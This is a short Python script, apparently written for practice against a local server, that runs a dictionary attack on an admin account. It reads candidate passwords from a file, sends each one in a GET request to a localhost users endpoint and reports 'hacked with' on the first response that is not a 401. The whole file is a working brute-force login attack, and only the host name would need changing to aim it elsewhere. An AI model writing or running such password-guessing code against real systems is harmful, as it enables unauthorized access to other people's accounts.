import requests
from requests.auth import HTTPBasicAuth

f = open("passwords.txt", "r")
hasła = f.read().split()

for i in hasła:
    response = requests.get(f"http://localhost:4000/users?login=admin&pass={i}")
    if response.status_code != 401:
        print("hacked with: " + i)
        break
    else:
        print(".")

f.close()
